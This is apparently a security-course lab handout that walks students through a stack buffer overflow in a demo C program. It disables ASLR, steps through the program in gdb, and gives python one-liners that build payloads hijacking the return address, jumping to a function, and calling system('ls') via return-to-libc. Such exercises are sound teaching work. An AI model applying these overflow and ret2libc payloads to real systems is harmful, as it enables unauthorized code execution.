# CYBER 366

## Prerequisites
#### disable address space layout randomization
``` bash
sudo bash -c "echo 0 > /proc/sys/kernel/randomize_va_space"
```

#### compile the demo program
``` bash
make
```

> note: to have a better debugging experience, you can compile the demo with debug information inside. Please check the Makefile for details.

## Vulnerability
``` c
int foo(char str2[]){
	char array[4];
	strcpy(array, str2);
	return 1;
}
```
`strcpy` doesn't check the boundary of the destination. The overflow occurs as long as the size of source buffer is larger than the destination. Here, the size of destination is 4, which could be smaller than the size of `str2`.

## Debugging
### hijack the control flow
After attaching gdb to the demo, pass input to the demo by running 
```bash=
start `cat hijack_to_BBBB_payload`
```

![](https://i.imgur.com/QyBWQ7J.png)

Go through the statement. 

![](https://i.imgur.com/t78Uhz7.png)

Check the instructions before the return of function foo.

![](https://i.imgur.com/IL9cx1P.png)

You should be able to run the program instruction by instruction using `ni`.

![](https://i.imgur.com/rtxyd23.png)

Now we are at the `ret` instruction of function `foo`, check the stack for the target we are returning to.

![](https://i.imgur.com/KPfRAsl.png)

When you continue executing, you will see the program has been hijacked to `0x42424242`

![](https://i.imgur.com/Q84OFJA.png)


#### How to generate the payload for this hijacking?
```bash=
python -c "print('A'*16 + 'BBBB')" > hijack_to_BBBB_payload
```
### hijack to print hello
Now we are able to hijack the control flow to arbitrary address, so we are able to let the program print `hello` if we hijack the control flow to function `bar`.

Just like hijacking to 0x42424242, check the adress on the stack that we are returning to in function `foo`.

#### How to generate the payload for this hijacking?
```bash=
python -c "print('A'*16 + '\x86\x84\x04\x08')" > hello_payload
```
> `\x86\x84\x04\x08` is the address of function `bar`

### Hijack to list the files
To list the files, we need to craft the payload of ROP that can execution 
```bash=
system("ls")
```

By checking the stack memory layout before the return in function `foo`, we see the memory looks like the following.

![](https://i.imgur.com/xNCKwoE.png)

Where we are jumping to the `0x08048330`, which is `system` function, with the argument referencing to `0x0804a07c`.


#### How to generate the payload for this hijacking?
```bash=
python -c "print('A'*16 + '\x30\x83\x04\x08' + 'BBBB' + '\x7c\xa0\x04\x08'+'ls')" > system_ls_payload
```
> '\x30\x83\x04\x08' is the address of `system`, 'BBBB' is left for padding, '\x7c\xa0\x04\x08' is the address of string `ls`.


## What to submit
Please take screenshot of each step below during the debugging process for three different payloads, paste them in a word document, and turn it in through canvas.
1. the process of going through statements
2. the stack memory layout before executing ret instruction in function `foo`
3. the output of the program after sending the payload
